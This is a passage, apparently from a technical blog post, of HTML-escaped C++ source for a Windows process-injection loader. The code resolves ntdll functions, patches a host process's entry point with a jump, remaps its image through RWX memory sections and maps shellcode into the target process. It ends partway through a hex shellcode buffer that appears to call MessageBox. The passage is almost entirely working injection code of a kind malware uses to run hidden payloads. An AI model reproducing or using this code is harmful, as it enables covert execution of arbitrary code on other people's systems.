myNtGetContextThread fNtGetContextThread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (myNtGetContextThread)(GetProcAddress(
    GetModuleHandleA(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ntdll&amp;#34;&lt;/span&gt;),
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NtGetContextThread&amp;#34;&lt;/span&gt;));
myNtSetContextThread fNtSetContextThread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (myNtSetContextThread)(GetProcAddress(
    GetModuleHandleA(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ntdll&amp;#34;&lt;/span&gt;),
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NtSetContextThread&amp;#34;&lt;/span&gt;));

DWORD &lt;span style=&#34;color:#a6e22e&#34;&gt;GetSizeOfImage&lt;/span&gt;(BYTE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; processImage)
{
    IMAGE_DOS_HEADER&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; dosHeader &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
    IMAGE_NT_HEADERS&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; ntHeaders &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;

    dosHeader &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (IMAGE_DOS_HEADER&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)processImage;
    ntHeaders &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (IMAGE_NT_HEADERS&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)((BYTE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)processImage &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; dosHeader&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;e_lfanew);

    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ntHeaders&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;OptionalHeader.SizeOfImage;
}

DWORD &lt;span style=&#34;color:#a6e22e&#34;&gt;GetEntryPoint&lt;/span&gt;(BYTE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; processImage)
{
    IMAGE_DOS_HEADER&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; dosHeader &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
    IMAGE_NT_HEADERS&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; ntHeaders &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;

    dosHeader &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (IMAGE_DOS_HEADER&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)processImage;
    ntHeaders &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (IMAGE_NT_HEADERS&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)((BYTE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)processImage &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; dosHeader&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;e_lfanew);

    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (ntHeaders&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;OptionalHeader.AddressOfEntryPoint);
}

PVOID &lt;span style=&#34;color:#a6e22e&#34;&gt;PatchHostProcess&lt;/span&gt;(HOST&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; hostProcess, PVOID shellcodeAddress)
{
    &lt;span style=&#34;color:#75715e&#34;&gt;// read enough bytes to get the size of image
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    SIZE_T bytesRead &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    BYTE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; imageData &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt;(BYTE[SECTION_SIZE]);

    &lt;span style=&#34;color:#75715e&#34;&gt;// both calls read the same chunk of same size because this readprocessmemory fails we change the size 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;ReadProcessMemory(
        hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;processHandle, 
        (LPCVOID)hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;imageBaseAddress, 
        imageData,
        SECTION_SIZE, 
        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;bytesRead) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; bytesRead &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; SECTION_SIZE)
    {
        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] failed to read process image headers&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
    }

    DWORD sizeOfImage &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GetSizeOfImage(imageData);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;delete&lt;/span&gt;[] imageData;

    BYTE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; processImage &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt;(BYTE[sizeOfImage]);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;ReadProcessMemory(
        hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;processHandle, 
        (LPCVOID)hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;imageBaseAddress, 
        processImage,
        sizeOfImage, 
        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;bytesRead) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; bytesRead &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; sizeOfImage)
    {
        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] failed to read process image&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
    }

    DWORD entryPoint &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GetEntryPoint(processImage);

    std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!]Original entry point : 0x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;hex &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;imageBaseAddress &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; entryPoint &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;

    memset(processImage &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; entryPoint, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x90&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;);

    DWORD processEntry &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;imageBaseAddress &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; entryPoint;

    DWORD relativeAddr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (((DWORD)shellcodeAddress &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; processEntry) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;);

    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((BYTE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)processImage &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; entryPoint) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xe9&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// jmp
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(uintptr_t&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)((uintptr_t)processImage &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; entryPoint &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; relativeAddr; &lt;span style=&#34;color:#75715e&#34;&gt;// address
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
    LARGE_INTEGER sectionSize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; { sizeOfImage };
    HANDLE sectionHandle &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
    PVOID sectionAddress &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fNtCreateSection(
        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;sectionHandle, 
        SECTION_ALL_ACCESS, 
        NULL, 
        (PLARGE_INTEGER)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;sectionSize, 
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT, NULL) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
    {
        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] create section failed&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
    }

    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fNtMapViewOfSection(
        sectionHandle, 
        GetCurrentProcess(), 
        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;sectionAddress, 
        NULL, NULL, NULL, 
        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;bytesRead, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, NULL, 
        PAGE_EXECUTE_READWRITE) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
    {
        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] create section failed&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
    }

    std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!]replacing patched process image at 0x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;hex &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;imageBaseAddress &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;

    memcpy(sectionAddress, processImage, sizeOfImage);
    sectionAddress &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (PVOID)hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;imageBaseAddress;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fZwUnmapViewOfSection(
        hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;processHandle, 
        sectionAddress) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
    {
        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] unmapping failed&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
    }

    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fNtMapViewOfSection(
        sectionHandle, 
        hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;processHandle, 
        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;sectionAddress, 
        NULL, NULL, NULL,
        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;bytesRead, 
        &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, NULL, 
        PAGE_EXECUTE_READWRITE) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
    {
        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;create section failed&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
    }

    CloseHandle(sectionHandle);

    &lt;span style=&#34;color:#66d9ef&#34;&gt;delete&lt;/span&gt;[] processImage;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (PVOID)processEntry;
}

PVOID &lt;span style=&#34;color:#a6e22e&#34;&gt;InjectShellcode&lt;/span&gt;(HOST&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; hostProcess, SHELLCODE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; s)
{
    LARGE_INTEGER sectionSize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; { s&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;shellcodeSize };
    HANDLE sectionHandle &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
    PVOID localSectionAddress &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL, remoteSectionAddress &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;

    &lt;span style=&#34;color:#75715e&#34;&gt;// create a read write execute memory region in the local process
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fNtCreateSection(
        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;sectionHandle, 
        SECTION_MAP_READ &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; SECTION_MAP_WRITE &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; SECTION_MAP_EXECUTE, 
        NULL,
        (PLARGE_INTEGER)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;sectionSize, 
        PAGE_EXECUTE_READWRITE, 
        SEC_COMMIT, 
        NULL) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
    {
        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[x]Create section failed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
    }

    &lt;span style=&#34;color:#75715e&#34;&gt;// create a view of the memory section in the local process
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fNtMapViewOfSection(
        sectionHandle, 
        GetCurrentProcess(), 
        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;localSectionAddress, 
        NULL, NULL, NULL,
        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;shellcodeSize, 
        &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, NULL, 
        PAGE_READWRITE) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
    {
        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[x]Create map failed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
    }

    &lt;span style=&#34;color:#75715e&#34;&gt;// create a map view of the section in the target process
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fNtMapViewOfSection(
        sectionHandle, 
        hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;processHandle, 
        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;remoteSectionAddress, 
        NULL, NULL, NULL,
        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;shellcodeSize, 
        &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, NULL, 
        PAGE_EXECUTE_READ) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
    {
        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[x]Create map failed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
    }

    memcpy(localSectionAddress, s&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;shellcode, s&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;shellcodeSize);
    std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!]Shellcode injected to 0x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;hex &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; (DWORD)remoteSectionAddress &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;

    CloseHandle(sectionHandle);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; remoteSectionAddress;
}


&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)
{
    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buf[] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x68\x6b\x74\x58\x20\x68\x74\x20\x72\x65\x68\x45\x3d\x67\x65&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
